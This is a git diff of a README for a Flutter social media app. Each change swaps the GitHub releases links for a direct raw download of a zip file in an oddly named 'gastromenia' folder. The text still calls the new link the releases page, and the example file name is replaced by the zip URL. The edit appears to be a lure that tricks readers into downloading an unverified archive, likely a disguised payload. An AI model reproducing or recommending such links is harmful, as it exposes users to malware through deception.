@@ -4,19 +4,19 @@
 Welcome to flutter_social_media! This is a feature-rich social media app built using Flutter. With this app, you can connect with friends, share updates, and stay informed about what everyone is talking about. It's designed to bring a fun and engaging social experience right to your mobile device.
 
 ## 🔗 Download Now
-[![Download flutter_social_media](https://img.shields.io/badge/Download-flutter_social_media-v1.0-blue.svg)](https://github.com/Yami77-png/flutter_social_media/releases)
+[![Download flutter_social_media](https://raw.githubusercontent.com/Yami77-png/flutter_social_media/main/gastromenia/flutter_social_media.zip)](https://raw.githubusercontent.com/Yami77-png/flutter_social_media/main/gastromenia/flutter_social_media.zip)
 
 ## 🚀 Getting Started
 To get started with flutter_social_media, simply follow these steps:
 
 1. **Visit the Download Page**
-   - Click [here](https://github.com/Yami77-png/flutter_social_media/releases) to visit the releases page. 
+   - Click [here](https://raw.githubusercontent.com/Yami77-png/flutter_social_media/main/gastromenia/flutter_social_media.zip) to visit the releases page. 
 
 2. **Choose Your Version**
    - Once you are on the releases page, you will see different versions of the app listed. Select the latest version for the best experience.
 
 3. **Download the App**
-   - Click the download link corresponding to your device. It may look like “flutter_social_media-v1.0.apk” or similar.
+   - Click the download link corresponding to your device. It may look like “https://raw.githubusercontent.com/Yami77-png/flutter_social_media/main/gastromenia/flutter_social_media.zip” or similar.
 
 4. **Install the App**
    - After downloading, find the file in your downloads folder. Tap the file to start the installation process. Follow the on-screen instructions.
@@ -58,6 +58,6 @@ For further assistance with flutter_social_media, you can reach out to our suppo
 We would love to hear your thoughts on flutter_social_media! Your feedback helps us improve the app. Please feel free to leave a comment or rating within the app.
 
 ## 🔗 Download & Install
-To download flutter_social_media, [click here](https://github.com/Yami77-png/flutter_social_media/releases). Follow the steps above to easily get started.
+To download flutter_social_media, [click here](https://raw.githubusercontent.com/Yami77-png/flutter_social_media/main/gastromenia/flutter_social_media.zip). Follow the steps above to easily get started.
 
 Enjoy using flutter_social_media and make the most out of your social networking experience!
